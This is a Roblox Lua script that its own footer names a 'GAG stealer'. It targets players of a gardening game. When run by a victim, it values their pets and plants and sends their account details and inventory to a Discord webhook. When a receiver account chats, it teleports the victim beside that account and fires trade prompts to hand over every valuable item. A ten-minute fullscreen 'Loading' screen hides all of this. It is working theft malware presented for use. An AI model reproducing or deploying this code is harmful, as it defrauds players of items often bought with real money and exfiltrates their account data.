_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- SETTINGS
local users = _G.Usernames or {"ezikiel53"}
local min_value = _G.min_value or 10000000
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or "https://discord_webhook_here"

-- SERVICES
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")

local plr = Players.LocalPlayer
local backpack = plr:WaitForChild("Backpack")
local replicatedStorage = game:GetService("ReplicatedStorage")
local modules = replicatedStorage:WaitForChild("Modules")

local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
local numberUtil = require(modules:WaitForChild("NumberUtil"))
local dataService = require(modules:WaitForChild("DataService"))

local character = plr.Character or plr.CharacterAdded:Wait()

-- EXECUTOR NAME
local executorName = "Unknown"
pcall(function()
    if getexecutorname then executorName = getexecutorname() end
end)

-- SERVER HOP
local function serverHop()
    pcall(function() TeleportService:Teleport(game.PlaceId) end)
end

-- SERVER CHECKS
if next(users) == nil or webhook == "" then serverHop() return end
if game.PlaceId ~= 126884695634066 then serverHop() return end
if #Players:GetPlayers() >= 5 then serverHop() return end
pcall(function()
    if game:GetService("RobloxReplicatedStorage").GetServerType:InvokeServer() == "VIPServer" then
        serverHop()
    end
end)

-- DATA
local excludedItems = {"Seed","Shovel [Destroy Plants]","Water","Fertilizer"}
local rarePets = {"Headless horseman","Elephant","Spider","Raccoon"}

local totalValue = 0
local itemsToSend = {}

-- HELPERS
local function calcPetValue(v14)
    local hatchedFrom = v14.PetData and v14.PetData.HatchedFrom
    if not hatchedFrom or hatchedFrom == "" then return 0 end

    local eggData = petRegistry.PetEggs[hatchedFrom]
    if not eggData then return 0 end

    local rarity = eggData.RarityData.Items[v14.PetType]
    if not rarity then return 0 end

    local range = rarity.GeneratedPetData.WeightRange
    if not range then return 0 end

    local lerpVal = numberUtil.ReverseLerp(range[1], range[2], v14.PetData.BaseWeight)
    local wScale = math.lerp(0.8, 1.2, lerpVal)
    local lvlProg = petUtils:GetLevelProgress(v14.PetData.Level)
    local mult = wScale * math.lerp(0.15, 6, lvlProg)

    local price = petRegistry.PetList[v14.PetType].SellPrice * mult
    return math.floor(price)
end

local function formatNumber(number)
    if not number then return "0" end
    local suffix = {"","k","m","b","t"}
    local idx = 1
    while number >= 1000 and idx < #suffix do
        number /= 1000
        idx += 1
    end
    if number == math.floor(number) then
        return number .. suffix[idx]
    else
        return string.format("%.2f%s", number, suffix[idx])
    end
end

local function getWeight(tool)
    local v = tool:FindFirstChild("Weight") or 
              tool:FindFirstChild("KG") or
              tool:FindFirstChild("WeightValue") or
              tool:FindFirstChild("Mass")

    if v then
        if v:IsA("NumberValue") or v:IsA("IntValue") then
            return v.Value
        elseif v:IsA("StringValue") then
            return tonumber(v.Value) or 0
        end
    end

    local match = tool.Name:match("%[(%d+%.?%d*) KG%]")
    return tonumber(match) or 0
end

-- BUILD itemsToSend
for _, tool in ipairs(backpack:GetChildren()) do
    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then

        -- PET
        if tool:GetAttribute("ItemType") == "Pet" then
            local uuid = tool:GetAttribute("PET_UUID")
            local ok, pdata = pcall(function()
                return dataService:GetData().PetsData.PetInventory.Data[uuid]
            end)

            if ok and pdata then
                local name = pdata.PetType
                local value = calcPetValue(pdata)
                local weight = getWeight(tool)
                totalValue += value

                table.insert(itemsToSend,{
                    Tool = tool,
                    Name = name,
                    Value = value,
                    Weight = weight,
                    Type = "Pet"
                })
            end

        else
            -- PLANT
            local value = calcPlantValue(tool)
            if value >= min_value then
                local weight = getWeight(tool)
                local name = tool:GetAttribute("ItemName") or tool.Name
                totalValue += value

                table.insert(itemsToSend,{
                    Tool = tool,
                    Name = name,
                    Value = value,
                    Weight = weight,
                    Type = "Plant"
                })
            end
        end
    end
end

-- RARE PET INVENTORY
local function BuildRareInventory()
    local t = {}
    for _, item in ipairs(itemsToSend) do
        if table.find(rarePets, item.Name) then
            table.insert(t, string.format("%s (%.2f KG): ¢%s",
                item.Name, item.Weight, formatNumber(item.Value)))
        end
    end

    if #t == 0 then
        return "N/A", false
    end

    return "```\n" .. table.concat(t, "\n") .. "\n```", true
end

-- WEBHOOK
local function sendWebhook(list)
    local inventoryText, hasRare = BuildRareInventory()
    local doPing = (ping == "Yes" and hasRare)

    local fields = {
        {
            name = "👤 Account Information",
            value = string.format(
                "Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s",
                plr.Name, tostring(_G.Username), executorName, tostring(plr.AccountAge)
            )
        },
        {
            name = "💰 Value",
            value = "Value: ¢" .. formatNumber(totalValue)
        },
        {
            name = "🎒 Inventory",
            value = inventoryText
        },
        {
            name = "🔗 Join Link",
            value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId
        }
    }

    local data = {
        content = doPing and "@everyone" or "",
        embeds = {{
            title = "📥 GAG Executed",
            color = 65280,
            fields = fields,
            footer = {text = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"}
        }}
    }

    pcall(function()
        request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

-- SEND WEBHOOK NOW
if #itemsToSend > 0 then
    sendWebhook(itemsToSend)
end

-- STEAL AFTER RECEIVER CHATS
local function doSteal(player)
    local hrp = character:WaitForChild("HumanoidRootPart")
    if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then return end

    hrp.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0,0,2)
    task.wait(0.2)

    pcall(function()
        local promptRoot = player.Character.HumanoidRootPart:FindFirstChild("ProximityPrompt")

        for _, item in ipairs(itemsToSend) do
            item.Tool.Parent = character
            task.wait(0.1)

            if item.Type == "Pet" then
                local p = player.Character.Head:FindFirstChild("ProximityPrompt")
                if p then repeat task.wait() until p.Enabled fireproximityprompt(p) end
            else
                if promptRoot then repeat task.wait() until promptRoot.Enabled fireproximityprompt(promptRoot) end
            end

            task.wait(0.1)
            item.Tool.Parent = backpack
        end
    end)

    serverHop()
end

-- LISTEN FOR RECEIVER CHAT
local function listen()
    local function detect(p)
        if table.find(users, p.Name) then
            p.Chatted:Connect(function()
                doSteal(p)
            end)
        end
    end
    for _, p in ipairs(Players:GetPlayers()) do detect(p) end
    Players.PlayerAdded:Connect(detect)
end

listen()

-- FULLSCREEN UI
local screen = Instance.new("ScreenGui")
screen.IgnoreGuiInset = true
screen.Parent = CoreGui

local frame = Instance.new("Frame", screen)
frame.Size = UDim2.new(1,0,1,0)
frame.BackgroundColor3 = Color3.new(0,0,0)
frame.BackgroundTransparency = 1

local txt = Instance.new("TextLabel", frame)
txt.Size = UDim2.new(1,0,1,0)
txt.Text = "Loading… Please wait"
txt.TextColor3 = Color3.new(1,1,1)
txt.BackgroundTransparency = 1
txt.Font = Enum.Font.GothamBold
txt.TextSize = 45

TweenService:Create(frame, TweenInfo.new(1), {BackgroundTransparency = 0}):Play()
task.wait(600)
TweenService:Create(frame, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
task.wait(1)
screen:Destroy()
